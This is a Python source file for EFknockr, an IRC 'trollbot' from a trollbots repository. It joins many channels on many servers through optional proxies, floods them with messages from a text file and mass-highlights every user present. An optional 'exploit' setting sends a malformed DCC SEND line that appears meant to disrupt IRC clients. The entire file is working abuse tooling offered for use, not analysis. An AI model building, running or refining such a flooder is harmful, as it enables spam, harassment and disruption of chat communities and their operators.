#!/usr/bin/env python
# EFknockr (EFK)
# Developed by acidvegas in Python 3
# https://github.com/acidvegas/trollbots
# efknockr.py

import concurrent.futures
import os
import random
import ssl
import socket
import sys
import threading
import time

sys.dont_write_bytecode = True

import config

# Globals
msg_file  = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'msg.txt')
msg_lines = list()

def debug(msg):
    print(f'{get_time()} | [~] - {msg}')

def error(msg, reason=None):
    if reason:
        print(f'{get_time()} | [!] - {msg} ({reason})')
    else:
        print(f'{get_time()} | [!] - {msg}')

def error_exit(msg):
    raise SystemExit(f'{get_time()} | [!] - {msg}')

def get_time():
    return time.strftime('%I:%M:%S')

def keep_alive():
    try:
        while True:
            input('')
    except KeyboardInterrupt:
        sys.exit()

def random_int(min, max):
    return random.randint(min, max)

def random_str(size):
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(size))

class clone:
    proxy            = config.proxy
    vhost            = config.vhost
    part_message     = config.part_message
    exploit          = config.exploit
    join_throttle    = config.join_throttle
    mass_hilite      = config.mass_hilite
    max_channels     = config.max_channels
    minimum_users    = config.minimum_users
    message_throttle = config.message_throttle
    timeout          = config.timeout
    bad_msgs         = config.bad_msgs
    bad_numerics     = config.bad_numerics

    def __init__(self, server, options):
        self.server           = server
        self.port             = options['port']
        self.use_ipv6         = options['ipv6']
        self.use_ssl          = options['ssl']
        self.password         = options['password']
        self.channels         = options['channels']
        self.nickname         = config.nickname
        self.connected        = False
        self.bad_channels     = list()
        self.current_channels = list()
        self.messages         = msg_lines
        self.nicklist         = dict()
        self.sock             = None

    def attack(self):
        random.shuffle(self.channels)
        for channel in self.channels:
            if not self.connected:
                break
            try:
                self.join_channel(channel)
                time.sleep(self.join_throttle)
                while len(self.current_channels) >= self.max_channels:
                    time.sleep(1)
            except Exception as ex:
                error('Error occured in the attack loop!', ex)
                break

    def connect(self):
        try:
            self.create_socket()
            self.sock.connect((self.server, self.port))
            if self.password:
                self.raw('PASS ' + self.password)
            self.raw('USER {0} 0 * :{1}'.format(random_str(random_int(5,8)), random_str(random_int(5,8))))
            self.nick(self.nickname)
        except:
            error(f'Failed to connect to {self.server} server.')
            self.event_disconnect()
        else:
            self.listen()

    def create_socket(self):
        if self.use_ipv6:
            family = socket.AF_INET6
        else:
            family = socket.AF_INET
        if self.proxy:
            proxy_server, proxy_port = self.proxy.split(':')
            self.sock = socks.socksocket(family, socket.SOCK_STREAM)
            self.sock.setblocking(0)
            self.sock.setproxy(socks.PROXY_TYPE_SOCKS5, proxy_server, int(proxy_port))
        else:
            self.sock = socket.socket(family, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        if self.vhost:
            self.sock.bind((self.vhost,0))
        if self.use_ssl:
            self.sock = ssl.wrap_socket(self.sock)

    def dcc(self, target, data):
        self.sendmsg(target, f'\x01DCC SEND {data}\x01')

    def event_connect(self):
        debug(f'Connected to {self.server} server.')
        self.connected = True
        if self.channels:
            threading.Thread(target=self.attack).start()
        else:
            self.channels = []
            self.raw('LIST >' + str(self.minimum_users))

    def event_disconnect(self):
        self.connected = False
        self.sock.close()

    def event_end_of_list(self):
        if self.channels:
            debug(f'Loaded {len(self.channels)} channels from {self.server} server.')
            threading.Thread(target=self.attack).start()
        else:
            error(f'Found zero channels on {self.server} server.')
            self.raw('QUIT')

    def event_end_of_names(self, chan):
        self.current_channels.append(chan)
        debug(f'Knocking {chan} channel on {self.server}...')
        try:
            for line in self.messages:
                if chan in self.bad_channels:
                    break
                self.sendmsg(chan, line)
                time.sleep(self.message_throttle)
            if self.exploit:
                self.dcc(chan, f'" {random_str(random_int(10,99))} {random_str(random_int(10,99))} {random_str(random_int(10,99))}')
            if chan in self.nicklist and chan not in self.bad_channels:
                self.nicklist[chan] = ' '.join(self.nicklist[chan])
                if len(self.nicklist[chan]) <= 300:
                    self.sendmsg(chan, self.nicklist[chan])
                else:
                    while len(self.nicklist[chan]) > 300:
                        if chan in self.bad_channels:
                            break
                        segment = self.nicklist[chan][:300]
                        segment = segment[:-len(segment.split()[len(segment.split())-1])]
                        self.sendmsg(chan, segment)
                        self.nicklist[chan] = self.nicklist[chan][len(segment):]
                        time.sleep(self.message_throttle)
        except Exception as ex:
            error('Error occured in the attack loop!', ex)
        finally:
            if chan in self.current_channels:
                self.current_channels.remove(chan)
            if chan in self.bad_channels:
                self.bad_channels.remove(chan)
            if chan in self.nicklist:
                del self.nicklist[chan]
            try:
                self.part(chan, self.part_message)
            except:
                pass

    def event_list_channel(self, chan, users):
        self.channels.append(chan)

    def event_nick_in_use(self):
        self.nickname = self.nickname + '_'
        self.nick(self.nickname)

    def event_names(self, chan, names):
        if self.mass_hilite:
            if not chan in self.nicklist:
                self.nicklist[chan] = list()
            for name in names:
                if name[:1] in '~!@%&+:':
                    name = name[1:]
                if name != self.nickname and name not in self.nicklist[chan]:
                    self.nicklist[chan].append(name)

    def handle_events(self, data):
        args = data.split()
        if args[0] == 'PING':
            self.raw('PONG ' + args[1][1:])
        elif args[1] == '001':
            self.event_connect()
        elif args[1] == '322':
            if len(args) >= 5:
                chan  = args[3]
                users = args[4]
                self.event_list_channel(chan, users)
        elif args[1] == '323':
            self.event_end_of_list()
        elif args[1] == '353':
            chan = args[4]
            if chan + ' :' in data:
                names = data.split(chan + ' :')[1].split()
            elif ' *' in data:
                names = data.split(' *')[1].split()
            elif ' =' in data:
                names = data.split(' =')[1].split()
            else:
                names = data.split(chan)[1].split()
            self.event_names(chan, names)
        elif args[1] == '366':
            chan = args[3]
            threading.Thread(target=self.event_end_of_names, args=(chan,)).start()
        elif args[1] == '404':
            chan = args[3]
            for item in self.bad_msgs:
                if item in data:
                    error(f'Failed to message {chan} channel on {self.server}', '404: ' + item)
                    if chan not in self.bad_channels:
                        self.bad_channels.append(chan)
        elif args[1] == '433':
            self.event_nick_in_use()
        elif args[1] in self.bad_numerics:
            chan = args[3]
            error(f'Failed to knock {chan} channel on {self.server}', self.bad_numerics[args[1]])
        elif args[1] == 'PART':
            nick = args[0].split('!')[0][1:]
            chan = args[2]
            if nick == self.nickname and chan == self.channels[len(self.channels)-1]:
                self.quit()

    def join_channel(self, chan):
        self.raw('JOIN ' + chan)

    def listen(self):
        while True:
            try:
                data = self.sock.recv(1024).decode('utf-8')
                if data:
                    for line in [line for line in data.split('\r\n') if line]:
                        if line.startswith('ERROR :Closing Link:'):
                            raise Exception('Connection has closed.')
                        elif len(line.split()) >= 2:
                            self.handle_events(line)
                else:
                    raise Exception('No data recieved from server.')
            except (UnicodeDecodeError,UnicodeEncodeError) as ex:
                pass
            except Exception as ex:
                error('Unexpected error occured.', ex)
                break
        self.event_disconnect()

    def nick(self, nick):
        self.raw('NICK ' + nick)

    def part(self, chan, msg):
        self.raw(f'PART {chan} :{msg}')

    def quit(self):
        self.raw('QUIT')
        self.event_disconnect()

    def raw(self, msg):
        self.sock.send(bytes(msg + '\r\n', 'utf-8'))

    def sendmsg(self, target, msg):
        self.raw(f'PRIVMSG {target} :{msg}')

# Main
print(''.rjust(56, '#'))
print('#{0}#'.format(''.center(54)))
print('#{0}#'.format('EFknockr IRC Bot'.center(54)))
print('#{0}#'.format('Developed by acidvegas in Python 3'.center(54)))
print('#{0}#'.format('https://github.com/acidvegas/trollbots'.center(54)))
print('#{0}#'.format(''.center(54)))
print(''.rjust(56, '#'))
if not sys.version_info.major == 3:
    error_exit('EFknockr requires Python version 3 to run!')
if config.proxy:
    try:
        import socks
    except ImportError:
        error_exit('Missing PySocks module! (https://pypi.python.org/pypi/PySocks)')
if os.path.isfile(msg_file):
    msg_lines = [line.strip() for line in open(msg_file, mode='r', encoding='utf8', errors='replace').readlines() if line]
else:
    error_exit('Missing message file!')
debug(f'Loaded {len(msg_lines)} lines of messages.')
debug(f'Loaded {len(config.servers)} servers from config.')
server_list = list(config.servers.keys())
random.shuffle(server_list)
with concurrent.futures.ThreadPoolExecutor(max_workers=config.max_threads) as executor:
    checks = {executor.submit(clone(server, config.servers[server]).connect): server for server in server_list}
    for future in concurrent.futures.as_completed(checks):
        checks[future]
debug('Flooding is complete. (Threads still may be running!)')
keep_alive()